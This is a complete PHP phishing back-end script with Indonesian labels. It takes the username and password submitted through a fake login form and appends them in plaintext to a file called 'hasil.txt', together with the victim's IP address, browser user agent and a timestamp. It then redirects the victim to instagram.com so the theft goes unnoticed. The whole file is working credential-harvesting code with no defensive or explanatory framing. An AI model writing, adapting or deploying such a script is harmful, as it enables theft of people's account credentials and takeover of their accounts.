<?php
$file = "hasil.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");

$data = "================================\n";
$data .= "Waktu: $date\n";
$data .= "IP: $ip\n";
$data .= "User Agent: $useragent\n";
$data .= "Username: ".$_POST['username']."\n";
$data .= "Password: ".$_POST['password']."\n";
$data .= "================================\n\n";

file_put_contents($file, $data, FILE_APPEND);

header("Location: https://www.instagram.com");
exit();
?>
